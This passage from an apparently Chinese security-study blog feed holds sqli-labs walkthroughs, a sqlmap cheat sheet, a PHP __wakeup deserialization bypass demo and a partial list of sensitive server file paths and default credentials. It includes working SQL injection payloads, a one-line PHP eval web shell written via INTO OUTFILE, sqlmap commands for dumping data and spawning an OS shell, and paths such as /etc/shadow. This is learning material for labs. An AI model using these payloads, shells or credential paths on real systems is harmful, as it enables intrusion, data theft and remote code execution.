<h2 id="第42关"><a href="#第42关" class="headerlink" title="第42关"></a>第42关</h2><p>这关和之前的24关卡有点像 但是这关需要使用堆叠注入，并且在一开始登录的时候是没有对密码进行过滤的，所以我们可以添加一个我们的插入语句，因为在更改密码的时候 他依旧没有对用户名进行过滤，所以我们一开始在插入的时候就可以像之前一样,不对，其实是不一样的，因为我们知道前面我们是用#号注释掉后面，这样修改密码就是修改admin的了，就不存在报错，但是在这里，我们插入了语句，我们使用#就会把我们的插入语句后面给注释掉了，就导致报错无法正确插入数据：<br>payload：admin=adm;<br>                password=1’;insert into users values(15,’admin’,’admin’) –<br>当然也可以进行update修改 delete删除等操作，前提是要先知道他的表叫users；<br> <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208215521.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208215523.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208215522.png" alt="img" style="zoom:67%;"><br>接下来知道45关都是一样的，就不说了</p>
<p>小结：</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlilabs8</title>
    <url>/2020/12/08/sqlilabs8/</url>
    <content><![CDATA[<h2 id="第46关"><a href="#第46关" class="headerlink" title="第46关"></a>第46关</h2><p>在这一关中我们看标题 是order by注入</p>
<p>那么我们就先再把order by了解一下吧          <a id="more"></a><br>感觉现在才真正理解order by为什么在前面可以用来查询字段数（列数），因为order by可以让每个列明按照升序或者降序的方式进行排序，所以当不存在这么多列的时候，他就不存在了。（这个理解有点浅薄，故再去查找了一下资料）:<br>其实在看完说明书后，我还不是很理解，不是很懂order by为什么可以注入 因为我觉得他不像报错注入时间盲注那些有地方可以直接让我写代码，他后面还需要加数字，所以我就很纳闷。<br>但是：在我发现order by后面的排序可以变成升序或者降序输入的时候，我突然有了一丝感觉：<br>注入究竟是啥？指的不就是我们在外部输入的命令能被带进去数据库里面执行吗，所以只要满足：能被代入数据库执行命令，其实就存在可能注入点<br>知道这点我们<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201211010924.png" alt="img"></p>
<p>我们可以发现，order by后面的<strong>数字</strong>是一个可控的参数，我们可以利用这个来构造我们的语句，使其被数据库执行，</p>
<p>而在这题中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208221422.png" alt="img"></p>
<p>他的查询语句是对我们输入的那一行进行排序输出的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201208221816.png" alt="img"></p>
<p>看上面 他要求我们输入的一个sort  所以我们现在不能再?id=多少 而是要?sort=多少，然后再看他的查询语句，对于id是没有加引号之类的，所以是数字型注入，然后我们在想，要在order by 后面加上什么才会被执行呢，首先是<strong>不能有引号</strong>语句，如果有要将引号内的内容转给十六进制的，如果要加select，我们需要union来拼接，但是在这题中是行不通的，这是一个语法问题，：有union的时候，order by要以最后一个union为准，所以 order by必须放在最后一个union后面，那么我们只能换一种，<br>首先我们先来考查一下是否存在注入点——根据我们输入的语句，页面发生变化<br>构建<strong>payload:</strong>?sort=rand(true)<br>                       ?sort=rand(false)<br>rand()是产生一个随机数，但其实我们这里赋予了一个true和false，他里面的值就会不一样，而如果页面发生了改变，就说明我们的注入已经生效了，其实这里的本质是，测试这里能使用的语句都有啥，我们使用了rand(）函数，发现是可以产生页面变化的，然后里面的true和false其实代表的是1和0</p>
<p><strong>rand()函数</strong>：<br>RAND()函数调用可以在0和1之间产生一个随机数：</p>
<p>首先是报错注入：<br>?sort=(extractvalue(1,concat(‘~’,database())) //这里连注释都不用，因为这个id后无其他语句<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201217165349.png" alt="img" style="zoom:50%;"><br>这样子是成功的，下一个语句：堆叠注入，由于没有mysqli_multi_query所以不行<br>接下来是时间盲注<br>?sort =1 and if(substr((select database()),1,8)=0x7365637572697479),1,sleep(5)<br>有效果，但是时间很长，所以我就在想为什么，(<strong>注意 sleep 是存在一个满足条件的行就会延迟指定的时间，比如sleep(5)，但是实际上查找到两个满足条件的行，那么就会延迟10s,这其实是一个非常重要的信息，在真实的渗透测试过程中，我们有时候不清楚整个表的情况的话，可以用这样的方式进行刺探，比如设置成 sleep(0.001) 看最后多少秒有结果，推断表的行数</strong>)<br>原来是这样，参考链接：<a href="https://blog.csdn.net/weixin_43536759/article/details/104882964">https://blog.csdn.net/weixin_43536759/article/details/104882964</a><br>这里再介绍另外一种时间盲注：<br>benchmark（a,md5(1))是对某个计算（md5)重复多(a)次，不能精确掌控延迟时间<br>构建payload：<br>?sort= (select if(substring(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(‘1’)),null) from (select database() as current) as test)</p>
<p>接下来是布尔盲注<br>无反应<br><strong>procedure analyse</strong> 注入<br>procredure analyse中 支持两个参数：<br>那么我们就来构造试试，在mysql8.0中好像已经移除了，所以我们就蛮看一下，这个主要是用在oder by limit后面的<br> <strong>payload</strong>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);<br>这个是构建的payload 而这里添加除了time-base的语句 其他好像都不太行</p>
<p>学习链接：<a href="https://www.freebuf.com/articles/web/57528.html">https://www.freebuf.com/articles/web/57528.html</a></p>
<p>试试上传文件注入 正好好久没碰了，复习一下</p>
<p>在之前我们是通过构建<br> union select “?php @eval($_post[cmd]);?&gt;” into oufile 目标文件夹（能被PHP在网页打开的文件地址）<br>然后构造完以后我们就可以利用菜刀连接就行了<br>下面我们在这里试一下，也是可以的</p>
<p>第四十七关：加个单引号<br>第四十八关：无报错，所以只能用时间盲注，或者布尔盲注<br>第四十九关：同上</p>
<h3 id="第五十关"><a href="#第五十关" class="headerlink" title="第五十关"></a>第五十关</h3><p>看到了<strong>mysql_multi-query</strong><br>所以我们可以用堆栈注入，直接拼接就行，再看后面也无啥过滤的东西</p>
<p>51关：加了个单引号<br>52关：没有报错，但是可以继续堆栈注入<br>53关：单引号无报错，可堆栈注入，时间，布尔啥的就不说了</p>
<h2 id="第五十四关"><a href="#第五十四关" class="headerlink" title="第五十四关"></a>第五十四关</h2><p>在这关当中，他是需要我们最后提交一个key，并且这个key是藏在一个新的库里面的，并且过了十秒钟后这个key就会刷新，<br>我们看了一下源码，可以发现，<br>**next_tryy();**就代表着时间，随意修改时间次数<br>他其实需要两种传输方式<br>POST：提交key<br>GET：获取id<br>并且在KEY那一栏有了过滤使用了mysqli_real_escape_string以及addslashes两个函数进行过滤<br>但是在id那一栏里面啥也没过滤，并且是以单引号进行闭合的。<br>所以我们就在id那边进行注入<br>思考：如果我们没看源代码，如何知道呢？<br>题目黄字就说 input the id了 而下面的key现在只是在迷惑你哈哈</p>
<p>好的知道这些再来看源码 他是不报错的，在我们登录后 他是有跳出两个栏，所以我们试一下union拼接select 注入<br>先用order by查询字段数，然后打一套组合拳就可以了<br><strong>payload：</strong><br>?id=-1’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+<br>接下来就是根据他的动态码去编写payload即可<br>往后的关卡都是变形，没啥好说的。</p>
<h4 id="sqlilabs做题小结："><a href="#sqlilabs做题小结：" class="headerlink" title="sqlilabs做题小结："></a>sqlilabs做题小结：</h4><p>1.知道他是需要获取什么数据 是?sort 还是?id<br>2.判断是否有注入点<br>常见闭合形式：<br>‘ ’‘ “ ’） ‘’）。。。。。。基于此变形，就是单引号和括号的组合<br>判断手法&amp; 和| 还有 rand()<br>3.order by后注入 还是直接 where后注入<br>4.判断要使用什么注入手法：<br>有报错——报错注入<br>union可用——考虑union 拼接select<br>除此以外——考虑文件上传注入（一句话木马），时间，布尔盲注<br>是否有gbk编码，考虑宽字节注入<br>是否有mysqli_multi_query 考虑堆栈注入</p>
<p>5.是否有waf需要绕过<br>例如空格可以采取%a0 还有and or 大小写联合书写，或者重复书写，过滤单引号，根据过滤方式选择手段，是直接转义添加/还是直接去掉变成null，在书写select的时候可以将最后’库名’转化为十六进制进行书写0x*<strong>**</strong>类似<br>6.然后还有很多要学，继续努力</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap学习</title>
    <url>/2020/12/17/sqlmap%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="get类型："><a href="#get类型：" class="headerlink" title="get类型："></a>get类型：</h2><p>1.查看是否有注入点：sqlmap -u 网址                 <a id="more"></a><br>2.出数据库名：sqlmap -u 网址 –dbs<br>3.出数据库的表名：sqlmap -u 网址 -D security –tables<br>4.出数据库的列名：sqlmap -u 网址 -D security -T users –columns<br>5.出数据：sqlmap -u -D security -T users -C id,password,username –dump</p>
<h2 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h2><p>使用burp抓包，将请求内容保存在txt文件中（或者使用-u 网址 –data ‘data’来代替）<br>1.使用sqlmap检查是否存在注入点：sqlmap -r 文档位置<br>2.使用sqlmap爆库名：sqlmap -r 文档位置 –dbs</p>
<h2 id="设置线程"><a href="#设置线程" class="headerlink" title="设置线程"></a>设置线程</h2><p>这里需要先去配置文件改一下最大线程<br>然后再命令的最后加上 –threads+数字</p>
<h2 id="查看当前用户以及是否是dba用户"><a href="#查看当前用户以及是否是dba用户" class="headerlink" title="查看当前用户以及是否是dba用户"></a>查看当前用户以及是否是dba用户</h2><p>–current-user 查看用户<br>–is-dba 查看是否是dba<br>–hostname 查看主机名<br>–password暴力破解用户名密码</p>
<h2 id="枚举dbms的权限"><a href="#枚举dbms的权限" class="headerlink" title="枚举dbms的权限"></a>枚举dbms的权限</h2><p>–privileges –role</p>
<h2 id="爬取url："><a href="#爬取url：" class="headerlink" title="爬取url："></a>爬取url：</h2><p>–crawl=num（1，2，3，4：要爬取的深度）</p>
<h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><p><a href="https://mp.weixin.qq.com/s/f-iIm4u5CJo2niMgTor2EQ">https://mp.weixin.qq.com/s/f-iIm4u5CJo2niMgTor2EQ</a></p>
<h4 id="1-写入shell的前提"><a href="#1-写入shell的前提" class="headerlink" title="1.写入shell的前提"></a>1.写入shell的前提</h4><p>root权限，需要写文件的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(user,0x3a,file_priv) from mysql.user;</span><br><span class="line">出现Y，这就代表你有文件权限，N就是没有</span><br></pre></td></tr></table></figure>

<p>以下的就和在sqli-labs时写马的条件是一样的<br>需要知道绝对路径</p>
<p>–os-shell</p>
<p>sqlmap各种脚本使用说明：<a href="https://xz.aliyun.com/t/2746">https://xz.aliyun.com/t/2746</a></p>
]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP序列化反序列化以及其中的漏洞（一）</title>
    <url>/2021/02/22/wakeup-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E4%BB%A5%E5%8F%8A%E5%AE%9E%E9%99%85%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="wakeup-函数用法"><a href="#wakeup-函数用法" class="headerlink" title="__wakeup()函数用法"></a>__wakeup()函数用法</h3><p><code>__wakeup()</code>是用在反序列化操作中。unserialize()会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法。<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">	&#125;    </span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$d=unserialize(<span class="string">&#x27;O:1:&quot;A&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>最后页面输出了<code>Hello</code>。在反序列化的时候存在<code>__wakeup()</code>函数，所以最后就会输出<code>Hello</code>__wakeup()函数漏洞说明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> $full_name = <span class="string">&#x27;zhangsan&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">150</span>;</span><br><span class="line">    <span class="keyword">public</span> $grades = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup is invoked&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Student();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后页面上输出的就是Student对象的一个序列化输出，<br><code>O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code>。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br><code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。<br>当我们将上述的序列化的字符串中的对象属性修改为5，变为<br><code>O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;</code>。<br>最后执行运行的代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> $full_name = <span class="string">&#x27;zhangsan&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">150</span>;</span><br><span class="line">    <span class="keyword">public</span> $grades = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup is invoked&quot;</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Student();</span><br><span class="line">$stu = unserialize(<span class="string">&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>可以看到这样就成功地绕过了__wakeup()函数。</p>
<p>参考:<a href="https://blog.spoock.com/2016/11/03/php-wakeup/">https://blog.spoock.com/2016/11/03/php-wakeup/</a><br>(还没完结，记得补)</p>
]]></content>
  </entry>
  <entry>
    <title>window/linux敏感目录整理</title>
    <url>/2021/02/19/window-linux%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h2 id="0x01、配置文件"><a href="#0x01、配置文件" class="headerlink" title="0x01、配置文件"></a>0x01、配置文件</h2><h3 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h3><p>如果能够命令执行，直接使用查找命令吧。。。<a id="more"></a></p>
<p><strong>Linux 相关：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查找文件</span></span><br><span class="line">find / -name filename.ext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全盘查找含有 flag 的文件</span></span><br><span class="line">grep flag -r /</span><br></pre></td></tr></table></figure>

<p><strong>Windows 相关：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全盘查找文件，一定要加一个星号！</span></span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (password.txt*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.ini) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 C 盘中包含 password 字样的文件，一定要双引号！</span></span><br><span class="line">findstr /s /n <span class="string">&quot;password&quot;</span> c:\*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 pwd.txt 中是否包含 password 字样，一定要双引号！</span></span><br><span class="line">find /N /I <span class="string">&quot;password&quot;</span> pwd.txt</span><br></pre></td></tr></table></figure>



<h3 id="常见的配置文件名"><a href="#常见的配置文件名" class="headerlink" title="常见的配置文件名"></a>常见的配置文件名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># apache</span></span><br><span class="line">httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">my.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟主机配置</span></span><br><span class="line">httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># IIS</span></span><br><span class="line">metabase.xml</span><br><span class="line">applicationHost.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh</span></span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx</span></span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/etc/nginx/sites-enabled/default</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">php.ini</span><br><span class="line"><span class="comment"># weblogic 读密码</span></span><br><span class="line">./security/SerializedSystemIni.dat</span><br><span class="line">./config/config.xml</span><br></pre></td></tr></table></figure>



<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置文件路径</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认站点路径</span></span><br><span class="line">/var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu 下配置文件</span></span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问日志和错误日志</span></span><br><span class="line">/private/var/<span class="built_in">log</span>/apache2/error_log</span><br><span class="line">/private/var/<span class="built_in">log</span>/apache2/access_log</span><br></pre></td></tr></table></figure>



<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">web.config</span><br></pre></td></tr></table></figure>



<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf </span><br></pre></td></tr></table></figure>



<h3 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">config.inc.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认路径</span></span><br><span class="line">/var/www/phpmyadmin/config.inc.php</span><br></pre></td></tr></table></figure>



<h3 id="XAMPP-建站"><a href="#XAMPP-建站" class="headerlink" title="XAMPP 建站"></a>XAMPP 建站</h3><p>相关路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网站默认路径</span></span><br><span class="line">xampp\htdocs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache 基本配置</span></span><br><span class="line">xampp\apache\conf\httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache SSL</span></span><br><span class="line">xampp\apache\conf\ssl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Perl（仅限插件）</span></span><br><span class="line">xampp\apache\conf\perl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Tomcat（仅限插件）</span></span><br><span class="line">xampp\apache\conf\java.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Python（仅限插件）</span></span><br><span class="line">xampp\apache\conf\python.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟主机</span></span><br><span class="line">xampp/apache/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">xampp\php\php.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库默认路径</span></span><br><span class="line">xampp\mysql\data</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">xampp\mysql\bin\my.ini </span><br><span class="line"></span><br><span class="line"><span class="comment"># phpMyAdmin</span></span><br><span class="line">xampp\phpMyAdmin\config.inc.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla FTP 服务器</span></span><br><span class="line">xampp\FileZilla</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP\FileZilla </span></span><br><span class="line">Server.xml Mercury </span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件服务器基本配置</span></span><br><span class="line">xampp\MercuryMail\MERCURY.INI </span><br><span class="line"></span><br><span class="line"><span class="comment"># Sendmail</span></span><br><span class="line">xampp\sendmail\sendmail.ini </span><br></pre></td></tr></table></figure>

<p>默认密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">User: root   Password:（空）</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla FTP</span></span><br><span class="line">User: newuser   Password: wampp</span><br><span class="line">User: anonymous   Password: some@mail.net</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mercury</span></span><br><span class="line">Postmaster: postmaster (postmaster@localhost) </span><br><span class="line">Administrator: Admin (admin@localhost) </span><br><span class="line">TestUser: newuser   Password: wampp </span><br><span class="line"></span><br><span class="line"><span class="comment"># WEBDAV</span></span><br><span class="line">User: wampp   Password: xampp</span><br></pre></td></tr></table></figure>



<h3 id="phpStudy-建站"><a href="#phpStudy-建站" class="headerlink" title="phpStudy 建站"></a>phpStudy 建站</h3><p>还记得几年前用 phpStudy 建站，贼费劲，可能是当时技术太差了，端口占用、数据库管理啥的都很乱，今天（2019年08月02日）在 Windows 上又搭了一次，发现啥问题也没遇到，技术、产品的更新换代真的太快了。</p>
<p>现在还出了个 pro 版本，所以路径也相对的有了变化，本文以 Pro 版为例，如果是普通版，去掉 Pro 即可。</p>
<p>相关路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根目录</span></span><br><span class="line">phpstudy\WWW</span><br><span class="line">phpstudy_pro\WWW</span><br><span class="line"></span><br><span class="line"><span class="comment"># phpMyAdmin</span></span><br><span class="line">phpstudy_pro\WWW\phpMyAdmin4.8.5</span><br><span class="line"></span><br><span class="line"><span class="comment"># php：Pro 版本，以扩展的方式来显示插件。</span></span><br><span class="line">phpstudy_pro\Extensions\php\php7.3.4nts\php.ini</span><br></pre></td></tr></table></figure>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx 主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service 模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules 应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx 程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html 日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx 配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf </span><br></pre></td></tr></table></figure>



<h2 id="0x03、敏感文件"><a href="#0x03、敏感文件" class="headerlink" title="0x03、敏感文件"></a>0x03、敏感文件</h2><h3 id="探针等信息"><a href="#探针等信息" class="headerlink" title="探针等信息"></a>探针等信息</h3><p>在使用 <code>XAMPP/LAMPP/phpStudy/PHPnow</code> 建站时，可能留下来一些探针页面，可以找到一些可用的信息，比如 <code>Document_Root</code> 代表网站根目录，<code>session.save_path</code> 存放 <code>Session</code> 信息。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1.php</span><br><span class="line">l.php</span><br><span class="line">p.php</span><br><span class="line">u.ph</span><br><span class="line">tz.php</span><br><span class="line">test.php</span><br><span class="line">info.php</span><br><span class="line">ceshi.php</span><br><span class="line">tanzhen.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>



<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">c:\boot.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># IIS配置文件</span></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml </span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储Windows系统初次安装的密码</span></span><br><span class="line">c:\windows\repair\sam </span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL配置</span></span><br><span class="line">c:\ProgramFiles\mysql\my.ini </span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL root密码</span></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD </span><br><span class="line"></span><br><span class="line"><span class="comment"># php 配置信息</span></span><br><span class="line">c:\windows\php.ini </span><br></pre></td></tr></table></figure>



<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p><a href="https://www.oschina.net/action/GoToLink?url=http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 账户信息</span></span><br><span class="line">/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 账户密码文件</span></span><br><span class="line">/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache2默认配置文件</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟网站配置</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/apache2/conf/extra/httpd-vhost.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 配置文件</span></span><br><span class="line">/usr/<span class="built_in">local</span>/app/php5/lib/php.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache 配置文件</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL 配置文件</span></span><br><span class="line">/etc/my.conf       </span><br></pre></td></tr></table></figure>



<h2 id="0x04、常见-CMS"><a href="#0x04、常见-CMS" class="headerlink" title="0x04、常见 CMS"></a>0x04、常见 CMS</h2><h3 id="DeDeCms"><a href="#DeDeCms" class="headerlink" title="DeDeCms"></a>DeDeCms</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/member/templets/menulit.php</span><br><span class="line">/plus/paycenter/alipay/return_url.php</span><br><span class="line">/plus/paycenter/cbpayment/autoreceive.php</span><br><span class="line">/paycenter/nps/config_pay_nps.php</span><br><span class="line">/plus/task/dede-maketimehtml.php</span><br><span class="line">/plus/task/dede-optimize-table.php</span><br><span class="line">/plus/task/dede-upcache.php</span><br></pre></td></tr></table></figure>



<h3 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/wp-admin/includes/file.php</span><br><span class="line">/wp-content/themes/baiaogu-seo/footer.php</span><br></pre></td></tr></table></figure>



<h3 id="Ecshop"><a href="#Ecshop" class="headerlink" title="Ecshop"></a>Ecshop</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/api/cron.php</span><br><span class="line">/wap/goods.php</span><br><span class="line">/temp/compiled/ur_here.lbi.php</span><br><span class="line">/temp/compiled/pages.lbi.php</span><br><span class="line">/temp/compiled/user_transaction.dwt.php</span><br><span class="line">/temp/compiled/history.lbi.php</span><br><span class="line">/temp/compiled/page_footer.lbi.php</span><br><span class="line">/temp/compiled/goods.dwt.php</span><br><span class="line">/temp/compiled/user_clips.dwt.php</span><br><span class="line">/temp/compiled/goods_article.lbi.php</span><br><span class="line">/temp/compiled/comments_list.lbi.php</span><br><span class="line">/temp/compiled/recommend_promotion.lbi.php</span><br><span class="line">/temp/compiled/search.dwt.php</span><br><span class="line">/temp/compiled/category_tree.lbi.php</span><br><span class="line">/temp/compiled/user_passport.dwt.php</span><br><span class="line">/temp/compiled/promotion_info.lbi.php</span><br><span 